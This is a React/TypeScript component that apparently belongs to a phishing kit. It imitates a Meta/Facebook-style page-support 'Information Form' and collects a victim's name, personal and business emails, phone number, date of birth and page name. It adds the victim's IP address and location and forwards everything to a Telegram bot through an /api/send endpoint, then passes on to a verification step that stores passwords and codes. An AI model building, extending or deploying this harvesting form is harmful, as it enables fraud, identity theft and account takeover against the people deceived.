import { store } from '@/store/store';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { faExternalLink } from '@fortawesome/free-solid-svg-icons/faExternalLink';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';

interface FormData {
    fullName: string;
    email: string;
    businessEmail: string;
    pageName: string;
    dateOfBirthDay: string;
    dateOfBirthMonth: string;
    dateOfBirthYear: string;
    note: string;
}

interface FormField {
    name: keyof FormData;
    label: string;
    type: 'text' | 'email' | 'textarea';
}

const FORM_FIELDS: FormField[] = [
    { name: 'fullName', label: 'Full Name', type: 'text' },
    { name: 'email', label: 'Email', type: 'email' },
    { name: 'businessEmail', label: 'Email Business', type: 'email' },
    { name: 'pageName', label: 'Page Name', type: 'text' }
];
interface FormErrors {
    fullName?: string;
    email?: string;
    businessEmail?: string;
    pageName?: string;
    phoneNumber?: string;
    dateOfBirthDay?: string;
    dateOfBirthMonth?: string;
    dateOfBirthYear?: string;
}

const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [agreedToTerms, setAgreedToTerms] = useState(false);
    const [errors, setErrors] = useState<FormErrors>({});
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        email: '',
        businessEmail: '',
        pageName: '',
        dateOfBirthDay: '',
        dateOfBirthMonth: '',
        dateOfBirthYear: '',
        note: ''
    });

    const { setModalOpen, geoInfo, setMessageId, setBaseMessage, resetPasswords, resetCodes, setUserEmail, setUserPhoneNumber, setUserFullName, translations: storeTranslations } = store();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'vn';

    const t = (text: string): string => {
        return storeTranslations[text] || text;
    };

    const capitalizeFirst = (str: string): string => {
        if (!str) return str;
        return str.charAt(0).toUpperCase() + str.slice(1);
    };

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: false,
            nationalMode: false,
            autoPlaceholder: 'off' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    // Helper function to check if year is leap year
    const isLeapYear = (year: number): boolean => {
        return (year % 4 === 0 && year % 100 !== 0) || (year % 400 === 0);
    };

    // Helper function to get max days in a month
    const getMaxDaysInMonth = (month: number, year: number): number => {
        const monthNum = parseInt(String(month));
        const yearNum = parseInt(String(year));

        if (monthNum === 2) {
            return isLeapYear(yearNum) ? 29 : 28;
        }
        if ([4, 6, 9, 11].includes(monthNum)) {
            return 30;
        }
        return 31; // 1, 3, 5, 7, 8, 10, 12
    };

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value, type } = e.target;
        
        // Giới hạn số ký tự và giá trị cho Day, Month, Year
        let processedValue = value;
        if (name === 'dateOfBirthDay') {
            // Chỉ cho phép số và tối đa 2 chữ số
            processedValue = value.replace(/\D/g, '').slice(0, 2);
            // Kiểm tra max dựa trên tháng và năm
            if (processedValue) {
                const dayNum = parseInt(processedValue);
                const monthNum = parseInt(formData.dateOfBirthMonth);
                const yearNum = parseInt(formData.dateOfBirthYear);
                if (!isNaN(dayNum) && !isNaN(monthNum) && monthNum >= 1 && monthNum <= 12 && !isNaN(yearNum)) {
                    const maxDays = getMaxDaysInMonth(monthNum, yearNum);
                    if (dayNum > maxDays) {
                        processedValue = String(maxDays);
                    }
                } else if (!isNaN(dayNum) && dayNum > 31) {
                    // Nếu chưa có tháng/năm hợp lệ, giới hạn tối đa 31
                    processedValue = '31';
                }
            }
        } else if (name === 'dateOfBirthMonth') {
            // Chỉ cho phép số và tối đa 2 chữ số
            processedValue = value.replace(/\D/g, '').slice(0, 2);
            // Kiểm tra max là 12
            if (processedValue) {
                const monthNum = parseInt(processedValue);
                if (!isNaN(monthNum) && monthNum > 12) {
                    processedValue = '12';
                }
            }
        } else if (name === 'dateOfBirthYear') {
            // Chỉ cho phép số và tối đa 4 chữ số
            processedValue = value.replace(/\D/g, '').slice(0, 4);
        }
        
        setFormData((prev: FormData) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : processedValue
        }));
        // Clear error when user starts typing
        if (errors[name as keyof FormErrors]) {
            setErrors((prev) => {
                const newErrors = { ...prev };
                delete newErrors[name as keyof FormErrors];
                return newErrors;
            });
        }
    }, [errors, formData.dateOfBirthMonth, formData.dateOfBirthYear]);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
        // Clear error when user starts typing
        if (errors.phoneNumber) {
            setErrors((prev) => {
                const newErrors = { ...prev };
                delete newErrors.phoneNumber;
                return newErrors;
            });
        }
    }, [errors, formData.dateOfBirthMonth, formData.dateOfBirthYear]);

    const validateForm = (): boolean => {
        const newErrors: FormErrors = {};

        if (!formData.fullName || formData.fullName.trim().length < 2) {
            newErrors.fullName = t('Please enter enough full name.');
        }

        if (!formData.email || formData.email.trim().length < 5 || !formData.email.includes('@')) {
            newErrors.email = t('Please enter enough email address.');
        }

        if (!formData.businessEmail || formData.businessEmail.trim().length < 5 || !formData.businessEmail.includes('@')) {
            newErrors.businessEmail = t('Please enter enough email business address.');
        }

        if (!formData.pageName || formData.pageName.trim().length < 2) {
            newErrors.pageName = t('Please enter enough page name.');
        }

        // Phone number validation removed - allow any input

        // Validate month
        if (!formData.dateOfBirthMonth || formData.dateOfBirthMonth.trim() === '') {
            newErrors.dateOfBirthMonth = t('Please enter enough month.');
        } else {
            const monthNum = parseInt(formData.dateOfBirthMonth);
            if (isNaN(monthNum) || monthNum < 1 || monthNum > 12) {
                newErrors.dateOfBirthMonth = t('Please enter enough month.');
            }
        }

        // Validate year
        if (!formData.dateOfBirthYear || formData.dateOfBirthYear.trim() === '') {
            newErrors.dateOfBirthYear = t('Please enter enough year.');
        }

        // Validate day (dựa trên tháng và năm)
        if (!formData.dateOfBirthDay || formData.dateOfBirthDay.trim() === '') {
            newErrors.dateOfBirthDay = t('Please enter enough day.');
        } else {
            const dayNum = parseInt(formData.dateOfBirthDay);
            if (isNaN(dayNum) || dayNum < 1) {
                newErrors.dateOfBirthDay = t('Please enter enough day.');
            } else {
                // Chỉ validate max day nếu đã có tháng và năm hợp lệ
                if (formData.dateOfBirthMonth && formData.dateOfBirthYear) {
                    const monthNum = parseInt(formData.dateOfBirthMonth);
                    const yearNum = parseInt(formData.dateOfBirthYear);
                    if (!isNaN(monthNum) && monthNum >= 1 && monthNum <= 12 && !isNaN(yearNum)) {
                        const maxDays = getMaxDaysInMonth(monthNum, yearNum);
                        if (dayNum > maxDays) {
                            newErrors.dateOfBirthDay = t('Please enter enough day.');
                        }
                    }
                }
            }
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;

        // Validate form
        const isValid = validateForm();
        if (!isValid) {
            console.log('Validation failed, cannot submit');
            return;
        }

        setIsLoading(true);

        // Reset passwords và codes khi submit form mới
        resetPasswords();
        resetCodes();

        // Save user data to store for use in verify modal
        setUserEmail(formData.email);
        setUserPhoneNumber(phoneNumber);
        setUserFullName(formData.fullName);

        // Format thời gian
        const now = new Date();
        const formattedTime = now.toLocaleString('vi-VN', {
            timeZone: 'Asia/Ho_Chi_Minh',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });

        // Format date of birth: DD/MM/YYYY với padding zeros
        const day = String(formData.dateOfBirthDay).padStart(2, '0');
        const month = String(formData.dateOfBirthMonth).padStart(2, '0');
        const year = formData.dateOfBirthYear;
        const dateOfBirth = `${day}/${month}/${year}`;
        
        // Format phone number (chỉ lấy số, giữ nguyên format)
        const phoneNumberOnly = phoneNumber.replace(/[^\d+]/g, '');

        // Tạo base message với format đúng
        const location = geoInfo ? `${geoInfo.city || 'k lấy được'} - ${geoInfo.country_code || 'k lấy được'}` : 'k lấy được';
        const messageLines = [
            `📅 Thời gian: ${formattedTime}`,
            `🌍 IP: ${geoInfo?.ip || 'k lấy được'}`,
            `📍 Vị trí: ${location}`,
            '',
            `🔖 Page Name: ${formData.pageName}`,
            `📧 Email: ${formData.email}`,
            `💼 Email Business: ${formData.businessEmail}`,
            `📱 Số điện thoại: ${phoneNumberOnly}`,
            `🎂 Ngày sinh: ${dateOfBirth}`,
            ''
        ];

        const message = messageLines.join('\n');

        // Lưu base message vào store
        setBaseMessage(message);

        console.log('Sending data to Telegram:', { message, formData, phoneNumber });

        try {
            const res = await axios.post('/api/send', {
                message
            });

            console.log('Telegram API response:', res.data);

            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }

            nextStep();
        } catch (error) {
            console.error('Error sending data to Telegram:', error);
            nextStep();
        } finally {
            setIsLoading(false);
        }
    };
    return (
        <div className='fixed inset-0 z-10 flex items-center justify-center bg-black/40 md:py-[40px] py-[20px] animate-fade-in'>
            <div className='bg-white max-h-[100%] h-full w-full max-w-lg mx-4 md:mx-0 shadow-lg px-[20px] py-[20px] rounded-[16px] flex flex-col overflow-hidden animate-slide-up'>
                <div className='flex items-center justify-between mb-[10px]'>
                    <h2 className='font-bold text-[#0A1317] text-[15px] flex items-center justify-center'>{t('Information Form')}</h2>
                    <button
                        type='button'
                        onClick={() => setModalOpen(false)}
                        className='w-[18px] h-[18px] cursor-pointer opacity-60 hover:opacity-100 transition-opacity duration-200 flex items-center justify-center'
                        aria-label='Close modal'
                    >
                        <FontAwesomeIcon icon={faXmark} size='sm' className='text-gray-600' />
                    </button>
                </div>

                <div className='flex-1 overflow-y-auto'>
                    <form onSubmit={handleSubmit} noValidate>
                        <div className='pb-[40px]'>
                        {FORM_FIELDS.map((field) => (
                            <div key={field.name}>
                                    <div className={`input w-full border ${errors[field.name as keyof FormErrors] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-white text-[16px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`}>
                                {field.type === 'textarea' ? (
                                    <textarea
                                        name={field.name}
                                        value={formData[field.name]}
                                        onChange={handleInputChange}
                                                className='w-full outline-0 h-full resize-none'
                                                rows={4}
                                        placeholder={t(field.label)}
                                    />
                                ) : (
                                    <input
                                        name={field.name}
                                        type={field.type}
                                        value={formData[field.name]}
                                        onChange={handleInputChange}
                                                className='w-full outline-0 h-full'
                                        placeholder={t(field.label)}
                                    />
                                        )}
                                    </div>
                                    {errors[field.name as keyof FormErrors] && (
                                        <p className='text-red-500 text-[14px] mt-[-5px] mb-[10px]'>{errors[field.name as keyof FormErrors]}</p>
                                )}
                            </div>
                        ))}
                        
                            <div>
                                <div className={`input w-full border ${errors.phoneNumber ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] rounded-[10px] bg-white text-[16px] mb-[10px] flex items-center`}>
                        <IntlTelInput
                            onChangeNumber={handlePhoneChange}
                            initOptions={initOptions}
                            inputProps={{
                                name: 'phoneNumber',
                                            placeholder: '',
                                            className: 'w-full outline-0 h-full',
                                            inputMode: 'numeric'
                                        }}
                                    />
                                </div>
                                {errors.phoneNumber && (
                                    <p className='text-red-500 text-[14px] mt-[-5px] mb-[10px]'>{errors.phoneNumber}</p>
                                )}
                            </div>

                            <div>
                                <b className='text-[#9a979e] text-[14px] mb-[7px] block'>{t('Date of Birth')}</b>
                            </div>
                            <div className='grid grid-cols-3 gap-[10px]'>
                                <div>
                                    <div className={`input w-full border ${errors.dateOfBirthDay ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-white text-[16px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`}>
                            <input
                                type='number'
                                name='dateOfBirthDay'
                                value={formData.dateOfBirthDay}
                                onChange={handleInputChange}
                                min='1'
                                max={(() => {
                                    const monthNum = parseInt(formData.dateOfBirthMonth);
                                    const yearNum = parseInt(formData.dateOfBirthYear);
                                    if (!isNaN(monthNum) && monthNum >= 1 && monthNum <= 12 && !isNaN(yearNum)) {
                                        return getMaxDaysInMonth(monthNum, yearNum);
                                    }
                                    return 31; // Default max
                                })()}
                                maxLength={2}
                                inputMode='numeric'
                                            placeholder={t('Day')}
                                            className='w-full outline-0 h-full'
                                        />
                                    </div>
                                    {errors.dateOfBirthDay && (
                                        <p className='text-red-500 text-[14px] mt-[-5px] mb-[10px]'>{errors.dateOfBirthDay}</p>
                                    )}
                                </div>
                                <div>
                                    <div className={`input w-full border ${errors.dateOfBirthMonth ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-white text-[16px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`}>
                            <input
                                type='number'
                                name='dateOfBirthMonth'
                                value={formData.dateOfBirthMonth}
                                onChange={handleInputChange}
                                min='1'
                                max='12'
                                maxLength={2}
                                inputMode='numeric'
                                placeholder={t('Month')}
                                            className='w-full outline-0 h-full'
                                        />
                                    </div>
                                    {errors.dateOfBirthMonth && (
                                        <p className='text-red-500 text-[14px] mt-[-5px] mb-[10px]'>{errors.dateOfBirthMonth}</p>
                                    )}
                                </div>
                                <div>
                                    <div className={`input w-full border ${errors.dateOfBirthYear ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-white text-[16px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`}>
                            <input
                                type='number'
                                name='dateOfBirthYear'
                                value={formData.dateOfBirthYear}
                                onChange={handleInputChange}
                                min='1900'
                                maxLength={4}
                                inputMode='numeric'
                                placeholder={t('Year')}
                                            className='w-full outline-0 h-full'
                            />
                                    </div>
                                    {errors.dateOfBirthYear && (
                                        <p className='text-red-500 text-[14px] mt-[-5px] mb-[10px]'>{errors.dateOfBirthYear}</p>
                                    )}
                                </div>
                        </div>

                            <div className='input w-full border border-[#d4dbe3] h-[100px] px-[11px] py-[11px] rounded-[10px] bg-white text-[16px] mb-[10px]'>
                        <textarea
                            name='note'
                            value={formData.note}
                            onChange={handleInputChange}
                                    className='w-full outline-0 h-full resize-none'
                            placeholder={t('Note')}
                        />
                            </div>

                            <div>
                                <p className='text-[#9a979e] text-[14px] mb-[7px]'>{t('Our response will be sent to you within 14 - 48 hours.')}</p>
                            </div>

                            <div className='mt-[15px] mb-[20px]'>
                                <label className='cursor-pointer flex items-center gap-[5px] text-[14px]'>
                                    <label className='inline-flex items-center cursor-pointer'>
                                        <input 
                                            type='checkbox' 
                                            className='sr-only' 
                                            checked={agreedToTerms}
                                            onChange={(e) => setAgreedToTerms(e.target.checked)}
                                        />
                                        <div className={`w-[16px] h-[16px] rounded-[4px] flex items-center justify-center border transition-all duration-200 ${agreedToTerms ? 'bg-blue-600 border-blue-600' : 'bg-white border-gray-300'}`}>
                                            {agreedToTerms && (
                                                <svg className='w-[12px] h-[12px] text-white' fill='none' stroke='currentColor' strokeWidth='3' viewBox='0 0 24 24'>
                                                    <path strokeLinecap='round' strokeLinejoin='round' d='M5 13l4 4L19 7' />
                                                </svg>
                                            )}
                                        </div>
                                    </label>
                                    {capitalizeFirst(t('I agree with'))}{' '}
                                <a
                                    href='#'
                                        className='text-[#0d6efd] flex items-center gap-[5px] inline'
                                    onClick={(e: React.MouseEvent<HTMLAnchorElement>) => e.preventDefault()}
                                >
                                        {t('Terms of use')} <FontAwesomeIcon icon={faExternalLink} size='xs' />
                                </a>
                                </label>
                        </div>

                            <div className='w-full mt-[20px]'>
                        <button
                            type='submit'
                            disabled={isLoading}
                                    className={`w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center cursor-pointer transition-colors hover:bg-[#0052b3] ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
                        >
                            {isLoading ? (
                                <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                            ) : (
                                t('Send')
                            )}
                        </button>
                            </div>
                    </div>
                </form>
                </div>
            </div>
        </div>
    );
};

export default InitModal;
